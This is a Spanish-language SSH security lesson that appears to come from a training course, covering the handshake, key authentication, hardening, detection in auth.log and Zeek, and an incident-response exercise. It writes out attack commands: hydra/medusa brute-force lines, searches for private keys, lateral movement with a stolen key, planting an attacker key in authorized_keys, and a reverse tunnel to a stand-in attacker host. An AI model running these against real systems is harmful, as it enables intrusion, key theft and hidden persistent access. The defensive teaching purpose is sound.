¿Qué es SSH?

El reemplazo seguro de Telnet, rsh y rlogin

SSH (Secure Shell) es un protocolo criptográfico para operar servicios de red de forma segura sobre redes no confiables. Reemplazó a Telnet (texto claro) en 1995. Proporciona acceso remoto seguro, transferencia de archivos (SFTP/SCP), y tunneling.

Usos legítimos de SSH:
  • 🖥️ Administración remota de servidores Linux/Unix
  • 📁 Transferencia segura de archivos (SFTP, SCP)
  • 🚇 Tunneling de puertos y SOCKS proxy
  • 🔑 Autenticación con clave pública/privada sin contraseña
  • 🔒 Git sobre SSH (GitHub, GitLab, Bitbucket)
Abusos de SSH por atacantes:
  • 💥 Brute force de contraseñas (servicio expuesto a Internet)
  • 🔑 Robo de claves privadas SSH para acceso persistente
  • 📡 Tunneling para exfiltrar datos o saltar controles de red
  • 🌐 C2 (Command & Control) sobre SSH cifrado

Handshake y cifrado SSH

Negociación de algoritmos y establecimiento de canal cifrado

FASES DEL HANDSHAKE SSH:

1. TCP CONNECT (cliente → servidor, TCP/22)

2. BANNER EXCHANGE:
   Servidor → "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3"
   Cliente  → "SSH-2.0-OpenSSH_9.1"
   ⚠ El banner revela versión → buscar CVEs específicos

3. KEY EXCHANGE (SSH_MSG_KEXINIT):
   Negociación de algoritmos:
   - Key exchange: ecdh-sha2-nistp256, diffie-hellman-group14-sha256
   - Cifrado:      aes256-gcm@openssh.com, chacha20-poly1305
   - MAC:          hmac-sha2-256, umac-128
   - Compresión:   none, zlib@openssh.com

4. SERVER HOST KEY VERIFICATION:
   Servidor presenta su clave pública (Ed25519/ECDSA/RSA)
   Cliente verifica contra ~/.ssh/known_hosts
   ⚠ Primera conexión: "The authenticity of host can't be established"
   Si alguien acepta sin verificar → TOFU sin validación real

5. DIFFIE-HELLMAN KEY AGREEMENT:
   Genera session key sin transmitirla (forward secrecy)

6. AUTENTICACIÓN del usuario:
   a) Password: contraseña enviada CIFRADA (a diferencia de FTP)
   b) Public key: cliente firma con su clave privada → servidor verifica con pública
   c) GSSAPI/Kerberos: integración con AD

Todo el canal desde aquí: CIFRADO con la session key

Autenticación por clave pública

El estándar de oro — más seguro que contraseñas

GENERACIÓN DE PAR DE CLAVES:
  ssh-keygen -t ed25519 -C "admin@empresa.com"
  → Genera: ~/.ssh/id_ed25519       (clave privada — NUNCA compartir)
            ~/.ssh/id_ed25519.pub   (clave pública — se distribuye)

INSTALACIÓN DE CLAVE PÚBLICA EN SERVIDOR:
  ssh-copy-id -i ~/.ssh/id_ed25519.pub admin@servidor
  → Agrega la clave al servidor: /home/admin/.ssh/authorized_keys

TIPOS DE CLAVES (de mejor a peor):
  Ed25519 ✅ — más seguro, más rápido, clave pequeña (256 bits)
  ECDSA   ✅ — bueno, ampliamente compatible
  RSA     ⚠  — funciona pero necesita ≥4096 bits para ser seguro hoy
  DSA     ✖  — ROTO, no usar (max 1024 bits)

FLUJO DE AUTENTICACIÓN POR CLAVE PÚBLICA:
  1. Cliente: "quiero autenticar con mi clave pública Ed25519 xyz..."
  2. Servidor: verifica que xyz está en authorized_keys
  3. Servidor: genera challenge random, lo cifra con la clave pública xyz
  4. Cliente: descifra el challenge con su clave PRIVADA → responde
  5. Servidor: verifica la respuesta → autenticación exitosa

VENTAJA DE SEGURIDAD:
  → La clave privada NUNCA viaja por la red
  → Sin contraseña no hay nada que interceptar ni bruteforcear
  → Con passphrase en la clave privada: 2FA implícito
  → Con ssh-agent: un solo unlock de la clave por sesión

Ataque 1: Brute Force SSH

El ataque más común contra SSH expuesto a Internet

Cualquier servidor SSH expuesto a Internet recibe intentos de brute force en minutos. Los atacantes usan credenciales comunes (root/toor, admin/admin) y listas de contraseñas filtradas de breaches.

ESCALA REAL: Un servidor SSH expuesto a Internet recibe
  ~100-1000 intentos de login por hora de bots automatizados.
  → En 24h: hasta 24.000 intentos desde decenas de IPs distintas

HERRAMIENTAS COMUNES:
  hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10
  medusa -h target -u admin -P passwords.txt -M ssh -t 4
  ncrack -p 22 --user root -P top10k.txt target

DETECCIÓN en /var/log/auth.log:
  Jun 25 03:14:01 server sshd[1234]: Failed password for root from 1.2.3.4 port 51234 ssh2
  Jun 25 03:14:02 server sshd[1234]: Failed password for root from 1.2.3.4 port 51235 ssh2
  [... ×200 en 60 segundos ...]
  Jun 25 03:15:44 server sshd[1234]: Accepted password for admin from 1.2.3.4 port 51512 ssh2

DETECCIÓN en Zeek ssh.log:
  ts    id.orig_h     id.resp_h    auth_success  client      server
  ...   1.2.3.4       10.0.0.10    false         OpenSSH_8.4 OpenSSH_8.9p1
  [200 entradas con auth_success=false, luego una con true]

MITIGACIONES:
  1. Deshabilitar login por contraseña: PasswordAuthentication no
  2. Fail2ban o similar: ban automático tras N fallos
  3. Cambiar puerto (oscuridad, reduce ruido)
  4. AllowUsers — lista blanca de usuarios permitidos
  5. Solo auth por clave pública

MITRE ATT&CK: T1110.001 — Brute Force · T1021.004 — Remote Services: SSH

Ataque 2: SSH Key Theft

Robar claves privadas — acceso permanente sin contraseñas

Una vez que un atacante compromete un sistema, su primer objetivo es las claves SSH privadas. Con ellas, el atacante puede moverse lateralmente sin contraseñas y de forma silenciosa.

UBICACIONES DE CLAVES PRIVADAS SSH:
  ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ~/.ssh/id_ecdsa
  /root/.ssh/id_*   ← acceso root expone todas las claves
  /home/*/.ssh/id_* ← afecta a todos los usuarios

BÚSQUEDA DE CLAVES DURANTE POST-EXPLOITATION:
  find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
  grep -r "BEGIN.*PRIVATE KEY" /home /root /etc 2>/dev/null

MOVIMIENTO LATERAL CON CLAVE ROBADA:
  ssh -i stolen_id_rsa admin@servidor-prod-02
  → Acceso inmediato sin contraseña
  ssh -i stolen_id_rsa ubuntu@bastion.empresa.com
  → Pivoting: desde bastion atacar hosts internos

PERSISTENCIA: Agregar clave propia del atacante a authorized_keys
  echo "ssh-ed25519 AAAA...atacante... " >> ~/.ssh/authorized_keys
  → El admin no nota nada (hay múltiples claves)
  → El atacante sigue teniendo acceso aunque cambie su contraseña

DETECCIÓN:
  git diff / inotifywait en ~/.ssh/authorized_keys
  SIEM: alerta si se modifica authorized_keys fuera de ventana de cambios
  Zeek ssh.log: mismo usuario conectándose desde múltiples IPs/países
  → Imposible viajar Berlín→Buenos Aires en 5 min → cuenta comprometida

MITRE ATT&CK: T1552.004 — Private Keys · T1098.004 — Account Manipulation: SSH Authorized Keys

Ataque 3: SSH Tunneling como C2

Exfiltración y C2 oculto dentro de SSH cifrado

TIPOS DE SSH TUNNELING:

LOCAL FORWARDING (-L):
  ssh -L 8080:db-interno:5432 user@bastion.empresa.com
  Atacante accede a localhost:8080 → tráfico va cifrado a través del bastion
  → Accede a db-interno:5432 como si estuviera dentro de la red

REMOTE FORWARDING (-R):
  ssh -R 9001:localhost:22 user@atacante.com
  → El servidor del atacante expone el puerto 9001
  → Conectar a atacante.com:9001 → llega al SSH de la víctima
  → Backdoor: la víctima inicia la conexión (sale del firewall)

DYNAMIC FORWARDING (-D) — SOCKS PROXY:
  ssh -D 1080 user@bastion.empresa.com
  → Configura proxy SOCKS5 en localhost:1080
  → Todo el tráfico del navegador va cifrado por el túnel SSH
  → Atacante navega por la red interna como si estuviera adentro

C2 SOBRE SSH:
  → Muchos malwares usan SSH reverso para Command & Control
  → El tráfico parece SSH legítimo (TCP/22, cifrado)
  → Difícil de distinguir de administración legítima

DETECCIÓN DE TUNNELING ABUSIVO:
  Zeek ssh.log: sesiones SSH muy largas con alto throughput
    duration > 3600s + orig_bytes > 100MB → sospechoso
  Conexiones SSH salientes desde workstations (no deberían hacer SSH saliente)
  NetFlow: ssh a IPs externas desconocidas desde hosts de usuarios

MITRE ATT&CK: T1572 — Protocol Tunneling · T1048 — Exfiltration Over Alternative Protocol

Hardening SSH — configuración segura

Configuración mínima de seguridad para sshd_config

  • 🔑 Solo clave pública: PasswordAuthentication no · PubkeyAuthentication yes
  • 🚫 Sin login root: PermitRootLogin no
  • 👤 Lista blanca de usuarios: AllowUsers admin deploy
  • ⏱ Timeout de autenticación: LoginGraceTime 20
  • 📋 Logging máximo: LogLevel VERBOSE
  • 🔒 Algoritmos fuertes solamente: deshabilitar MD5, SHA1, DES
  • 🛡️ Fail2ban: ban automático tras 5 fallos en 10 minutos
  • 🌐 Firewall + VPN: TCP/22 no debería ser público — solo desde VPN o IP fija
# sshd_config — configuración mínima segura
Protocol 2
Port 22
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
LoginGraceTime 20
MaxAuthTries 3
AllowUsers admin deploy
LogLevel VERBOSE
X11Forwarding no
AllowTcpForwarding no    # deshabilitar tunneling si no es necesario
GatewayPorts no
KexAlgorithms curve25519-sha256,ecdh-sha2-nistp256
Ciphers aes256-gcm@openssh.com,chacha20-poly1305@openssh.com

EJ-03 Diseñar política SSH segura para la empresa Medio

La empresa tiene 50 servidores Linux accesibles por SSH desde Internet. El equipo de seguridad te pide diseñar la política SSH. ¿Qué configuraciones, controles y monitoreo implementás?

ACCESO SOLO POR VPN / BASTION HOST: → TCP/22 bloqueado en firewall perimetral para IPs públicas → Solo acceso via VPN corporativa → SSH interno → O bastion host con IP fija (jump server): ssh -J bastion servidor → Reducción de superficie de ataque: de Internet → de VPN 2. QUÉ SIGNIFICA: SSH detectó que la clave pública del servidor prod-server-01 cambió. La clave que presenta el servidor HOY es diferente a la que estaba en ~/.ssh/known_hosts cuando se conectó por primera vez. CAUSAS POSIBLES (no necesariamente maliciosas): CAUSA 1: El servidor fue reinstalado / reimaged → Al reinstalar el OS, se regeneran las host keys de SSH → Muy común en cloud (nueva instancia, nuevo IP, nuevo AMI) → También pasa al clonar una VM CAUSA 2: El admin cambió manualmente las host keys → Para rotación de seguridad o migración CAUSA 3: ATAQUE REAL: Man-in-the-Middle → Alguien interceptó la conexión y presenta su propia clave → El atacante puede leer/modificar toda la sesión SSH → Más probable en WiFi pública o si hay ARP spoofing en la red CÓMO DETERMINAR SI ES LEGÍTIMO O ATAQUE: 1. Verificar por otro canal seguro: → Llamar/mensajear al admin del servidor: "¿reinstalaron prod-server-01?" → Revisar tickets de cambio: ¿hay un change request de rebuild? → Revisar en la consola del cloud (AWS/Azure/GCP) la fingerprint actual 2. Comparar fingerprints: → La que muestra SSH: SHA256:xYz+AbCdEfGhIjKlMnOpQrStUvWxYz... → La real del servidor (vía consola del cloud o acceso físico): ssh-keygen -lf /etc/ssh/ssh_host_ed25519_key.pub 3. Si las fingerprints coinciden y fue reinstalado = actualizar known_hosts: ssh-keygen -R prod-server-01.empresa.com → Reconectar y verificar la nueva huella LO QUE NUNCA DEBE HACER: ❌ Editar /etc/hosts o known_hosts para "saltarse" la verificación sin confirmar ❌ Usar StrictHostKeyChecking=no (desactiva la verificación completamente) ❌ Conectarse de todas formas sin verificar → si es MitM, el atacante tiene su sesión CONCLUSIÓN: Esta alerta es el mecanismo defensivo de SSH funcionando correctamente. Si no hay una causa conocida, tratarlo como posible MitM hasta confirmar lo contrario.
🚨 Mini-Challenge · Resolver el incidente

Incidente #SSH-001: "El backdoor silencioso"

Viernes 18:00. El analista de turno nota una alerta baja: login SSH exitoso en prod-api-01 desde IP de Países Bajos (85.214.x.x). El usuario es "buildbot" — cuenta de CI/CD. El acceso duró 4 segundos. No hay alerta de brute force previo. El equipo de infraestructura no realizó ningún deploy. 

auth.log:
  Fri Jun 20 18:00:11 prod-api-01 sshd: Accepted publickey for buildbot
    from 85.214.143.22 port 59900 ssh2 RSA SHA256:newFP/xyz+abc...
  Fri Jun 20 18:00:15 prod-api-01 sshd: session closed for user buildbot

Contexto:
  - buildbot solo se conecta desde Jenkins CI (10.0.5.10) con la clave RSA SHA256:legitFP/ABC...
  - El fingerprint del login es SHA256:newFP/xyz+abc... (DISTINTO al legítimo)
  - 4 segundos — demasiado poco para un deploy real
  - El CI/CD de Jenkins no tiene ningún job activo a las 18:00
CHALLENGE ¿Qué ocurrió y cómo respondés? Difícil
QUÉ OCURRIÓ: Backdoor SSH — clave no autorizada agregada a authorized_keys ANÁLISIS DE LA EVIDENCIA: 1. Fingerprint diferente: Legítimo: SHA256:legitFP/ABC... (Jenkins CI, IP 10.0.5.10) El acceso: SHA256:newFP/xyz+abc... (IP holandesa, 85.214.143.22) → Alguien agregó su propia clave pública a /home/buildbot/.ssh/authorized_keys 2. IP holandesa: 85.214.143.22 → No está en ninguna lista de IPs corporativas → Probable VPS/servidor del atacante (Hetzner, common con atacantes EU) 3. Solo 4 segundos de sesión → Comando rápido: probablemente solo para verificar que el backdoor funciona → O para ejecutar un script de reconocimiento: whoami, hostname, cat /etc/shadow → Muy parecido a un "beacon check" de C2 4. Sin brute force previo → el atacante YA tenía la clave → La clave fue instalada en un ataque PREVIO que aún no detectamos VECTOR DE ATAQUE (hipótesis principal): El atacante comprometió el servidor Jenkins (10.0.5.10) anteriormente. Desde Jenkins, ejecutó un job malicioso o aprovechó acceso existente para: echo "ssh-rsa AAAA...attackerkey..." >> /home/buildbot/.ssh/authorized_keys en prod-api-01 (que buildbot ya tenía acceso legítimo) ACCIONES INMEDIATAS (T+0): 1. Aislar prod-api-01: no apagar aún (preservar evidencia), pero bloquear nueva red entrante iptables -A INPUT -p tcp --dport 22 -j DROP (excepto desde IPs de IR) 2. Preservar estado: ps auxwww > /tmp/processes.txt ss -tulnp > /tmp/connections.txt find /home/buildbot/.ssh/ -ls cat /home/buildbot/.ssh/authorized_keys 3. Remover el backdoor: # Identificar y eliminar la clave maliciosa de authorized_keys grep -v "newFP" /home/buildbot/.ssh/authorized_keys > /tmp/clean_keys mv /tmp/clean_keys /home/buildbot/.ssh/authorized_keys 4. Bloquear 85.214.143.22 en todos los firewalls INVESTIGACIÓN AMPLIADA (T+1h): 5. Auditar Jenkins (10.0.5.10) — ¿cómo se agregó la clave? → Revisar build logs, historial de jobs → Ver si alguien modificó un Jenkinsfile o script de deploy → ¿Hay otras claves no autorizadas en otros servidores que buildbot accede? 6. Correlacionar en SIEM: → ¿Cuándo se modificó authorized_keys en prod-api-01? → ¿Hubo otros logins de la misma clave (newFP) en otros servidores? → ¿La IP 85.214.143.22 aparece en otros logs? 7. Scope: ¿Cuántos servidores tiene acceso buildbot? → Revisar authorized_keys en TODOS esos servidores LECCIONES: 1. Alertar sobre CUALQUIER login SSH con fingerprint no registrado en CMDB 2. Monitorear authorized_keys con auditd o inotifywait — cambios = alerta inmediata 3. buildbot no debería poder instalar su propia clave — gestión centralizada de claves 4. El CI/CD (Jenkins) es un objetivo de alto valor — credenciales para acceder a TODOS los servers 5. Alertas de "baja severidad" como esta pueden ser los indicios de un ataque mayor

Zeek ssh.log — campos y consultas

# Brute force
zeek-cut ts id.orig_h auth_success < ssh.log \
  | awk '$3=="false"' | sort | uniq -c | sort -rn

# Sesiones largas (posible tunneling)
zeek-cut id.orig_h id.resp_h duration orig_bytes < ssh.log \
  | awk '$3 > 3600 && $4 > 50000000'

# Logins exitosos desde externas
zeek-cut id.orig_h auth_success < ssh.log \
  | awk '$2=="true" && $1 !~ /^10\./ && $1 !~ /^192\.168/'
